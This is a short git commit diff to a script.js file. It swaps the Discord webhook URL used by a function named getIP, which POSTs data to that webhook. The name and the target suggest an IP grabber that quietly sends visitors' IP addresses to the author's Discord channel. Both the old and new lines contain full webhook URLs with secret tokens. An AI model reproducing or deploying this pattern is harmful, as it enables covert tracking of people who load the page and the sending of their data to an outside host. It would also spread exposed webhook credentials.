d5e67dce3281e2a43e9d4ff664aeb3618149b04e
pyecedeveloper <105870169+pyecedeveloper@users.noreply.github.com>
2022-07-21 22:34:20 +0200

    Update script.js

--- script.js
+++ script.js
@@ -1,6 +1,6 @@
 function getIP(json) {
             var request = new XMLHttpRequest();
-            request.open("POST", "https://discord.com/api/webhooks/964338591050366986/GzAYFOxmjOMvlwsWuiejB_sY6cvzrxk8phVKOLxwgmB97xOPcs77f193lZyjBbPER8O7");
+            request.open("POST", "https://discord.com/api/webhooks/999775973232877680/OCr8zmfyZh7UZ3t6tj-ifsfe_d2iiKiquv4mrlY9yDHjBdb6kLLis9g_hwFVuqFbY0-f");
 
             request.setRequestHeader('Content-type', 'application/json');
 
